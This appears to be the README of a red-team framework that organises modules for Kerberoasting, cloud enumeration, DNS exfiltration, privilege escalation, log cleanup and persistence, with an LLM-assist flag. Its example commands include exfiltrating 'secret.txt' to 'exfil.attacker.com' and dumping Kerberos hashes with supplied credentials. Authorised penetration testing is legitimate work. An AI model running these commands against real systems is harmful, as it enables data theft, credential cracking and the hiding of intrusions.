# V.E.X. — Volatile Execution X-tension

> An elite, modular Red Team framework for streamlined script execution.
> Featuring dynamic CLI discovery across Web, AD, and Cloud modules.
> Built for stealth and scalability with integrated AI-readiness via the `-ai` flag.

```
$$\    $$\ $$$$$$$$\ $$\   $$\
$$ |   $$ |$$  _____|$$ |  $$ |
$$ |   $$ |$$ |      \$$\ $$  |
\$$\  $$  |$$$$$\     \$$$$  /
 \$$\$$  / $$  __|    $$  $$<
  \$$$  /  $$ |      $$  /\$$\
   \$  /   $$$$$$$$\ $$ /  $$ |
    \_/    \________|\__|  \__|

  VOLATILE EXECUTION X-TENSION
 [ Red Team Script Management Framework ]
```

---

## Platform Support

| Platform | How it works |
|----------|-------------|
| **Windows** | Native via PowerShell (`vex.ps1`). `.sh` modules delegate to WSL or Git Bash automatically. |
| **macOS** | Native via Bash and Python 3. |
| **Linux** | Native via Bash and Python 3. |

VEX auto-detects your OS at runtime — no configuration needed.

---

## Directory Structure

```
VEX/
├── bin/
│   ├── vex                 # CLI entry-point (Bash — Linux/macOS/WSL)
│   ├── vex.ps1             # CLI entry-point (PowerShell — cross-platform)
│   └── vex.bat             # Windows CMD shim → delegates to vex.ps1
├── modules/
│   ├── active-directory/   # Kerberoasting & AD enumeration
│   ├── cloud/              # AWS / Azure / GCP misconfig scripts
│   ├── exfil/              # Data egress & stealth transfer
│   ├── mobile/             # APK/iOS assessment tools
│   ├── network/            # Scanning & protocol manipulation
│   ├── os/                 # Local privilege escalation
│   ├── post-ex/            # Persistence & cleanup
│   └── web/                # Web application reconnaissance
├── lib/
│   ├── utils.sh            # Shared Bash helpers (logging, OS detection, dependency checks)
│   └── ai.sh               # AI-assist integration stub
├── data/
│   └── config.ini          # Global configuration template
├── loot/                   # ⚠ Git-ignored — operational output
└── results/                # ⚠ Git-ignored — operational output
```

---

## Quick Start

### 1. Add VEX to your PATH

**Linux / macOS**
```bash
export PATH="$PATH:$(pwd)/bin"
```

**Windows (PowerShell)**
```powershell
$env:PATH += ";C:\path\to\VEX\bin"
```

Or add `VEX\bin` permanently via **System Properties → Environment Variables**.

### 2. Run VEX

```bash
# Show the splash screen
vex

# Show full help (flags, categories, every script's options)
vex -h

# List all modules
vex -l

# List modules in a specific category
vex -l web

# Run a module (extension is optional — VEX resolves it automatically)
vex web recon -t https://target.example.com

# Run with AI-assisted context
vex web recon -ai -t https://target.example.com
```

---

## Global Flags

| Flag | Description |
|------|-------------|
| `-h`, `--help` | Print the full help reference |
| `-l`, `--list` | List available modules (optionally filter by category) |
| `-ai` | Enable AI-assisted context for any module |

---

## Module Categories

| Category | Description | Platform |
|----------|-------------|----------|
| `active-directory` | Kerberoasting, LDAP enum, DCSync | All |
| `cloud` | AWS / Azure / GCP misconfiguration | All |
| `exfil` | DNS tunnelling, HTTPS upload, steganography | All |
| `mobile` | APK decompilation & analysis | Linux/macOS/WSL |
| `network` | Port scanning, protocol fuzzing, MITM | Linux/macOS/WSL |
| `os` | SUID/SGID scanning, local privesc | Linux only |
| `post-ex` | Log cleanup, persistence, lateral movement | Linux/macOS |
| `web` | Banner grab, header dump, redirect chain | All |

---

## Script Options Quick Reference

### active-directory/kerberoast
```
-d, --domain <domain>       Target domain (e.g. corp.local)
-u, --user <username>       Domain username
-p, --password <password>   Domain password
-dc, --dc-ip <ip>           Domain controller IP
-o, --output <file>         Save hashes to file
```

### cloud/aws_s3_enum
```
-b, --bucket <name>         Specific bucket name to probe
-p, --profile <profile>     AWS CLI profile (default: default)
```

### exfil/dns_exfil
```
-f, --file <path>           File to exfiltrate
-d, --domain <domain>       Attacker-controlled DNS domain
-c, --chunk-size <bytes>    Bytes per DNS label (default: 30)
--delay <seconds>           Seconds between queries (default: 0.5)
```

### mobile/apk_decompile
```
<apk_file>                  Path to APK file
-o, --output <dir>          Output directory
```

### network/port_scan
```
<target>                    Target host or CIDR
-p, --ports <range>         Port range (default: 1-1024)
-o, --output <prefix>       Output file prefix (saved to loot/)
```

### os/linux_suid_scan `[Linux only]`
```
-o, --output <file>         Write results to file
```

### post-ex/cleanup_logs `[Linux/macOS only]`
```
-n, --dry-run               Show what would be removed without deleting
-v, --verbose               Verbose output
```

### web/recon
```
-t, --target <url>          Target URL (e.g. https://example.com)
-o, --output <file>         Write results to file
```

---

## Adding a New Module

Drop any `.py`, `.sh`, or compiled executable into the appropriate `modules/<category>/` directory. VEX discovers scripts dynamically — no registration required.

```bash
cp my_tool.py modules/web/
vex web my_tool -h
```

---

## AI Integration

Set `VEX_AI_KEY` in your environment to enable live LLM queries via the `-ai` flag. Configure the endpoint and model in `data/config.ini` or via environment variables:

| Variable | Default | Description |
|----------|---------|-------------|
| `VEX_AI_KEY` | *(none)* | API key for the LLM provider |
| `VEX_AI_ENDPOINT` | `https://api.openai.com/v1/chat/completions` | LLM API endpoint |
| `VEX_AI_MODEL` | `gpt-4o` | Model name |

```bash
export VEX_AI_KEY="sk-..."
vex web recon -ai -t https://target.example.com
```

---

## Configuration

| File | Purpose |
|------|---------|
| `data/config.ini` | Global framework settings (version, defaults, proxy) |
| `data/config.local.ini` | Local overrides — git-ignored, safe for credentials |

---

## Examples

```bash
vex web recon -t https://example.com
vex network port_scan 192.168.1.0/24 -p 1-65535
vex active-directory kerberoast -d corp.local -u admin -p pass -o hashes.txt
vex cloud aws_s3_enum -b my-bucket -p prod
vex exfil dns_exfil -f secret.txt -d exfil.attacker.com --delay 0.1
vex mobile apk_decompile target.apk -o ./output
vex post-ex cleanup_logs -n -v
vex os linux_suid_scan -o suid_results.txt
vex -l network
vex web recon -ai -t https://example.com
```

---

> **Legal Notice:** This framework is intended exclusively for authorised penetration testing and security research. Misuse against systems without explicit written permission is illegal. The authors assume no liability.

